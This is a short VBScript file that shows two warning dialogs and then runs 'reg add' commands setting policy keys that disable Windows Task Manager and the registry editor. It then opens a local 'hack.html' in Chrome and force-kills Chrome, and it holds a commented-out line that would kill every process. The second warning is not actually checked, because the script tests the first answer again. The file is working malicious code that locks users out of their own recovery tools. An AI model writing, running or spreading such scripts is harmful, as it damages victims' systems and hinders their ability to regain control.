

answer = MsgBox("WARNING: This can harm your computer, Do you want to run it", vbYesNo, "WARNING")

Function run()
    set shell = createobject("wscript.shell")
    set fso = createobject("scripting.filesystemobject")
    msgbox fso.GetParentFolderName(WScript.ScriptFullName) & "hack.html", 0+16, "test"
    shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
    shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"
   shell.run "chrome " & fso.GetParentFolderName(WScript.ScriptFullName) & "hack.html"
  wscript.sleep 3000
  shell.run "taskkill /f /im chrome.exe"
    ' shell.run "taskkill /f /im *"
End Function

If answer = vbYes Then
    answer2 = MsgBox("WARNING 2:If you run the program, it will destroy the computer, Do you want to actually proceed?", vbYesNo, "WARNING")
    If answer = vbYes Then
     run
    Else
     wscript.quit
    End If
Else
    wscript.quit
End If
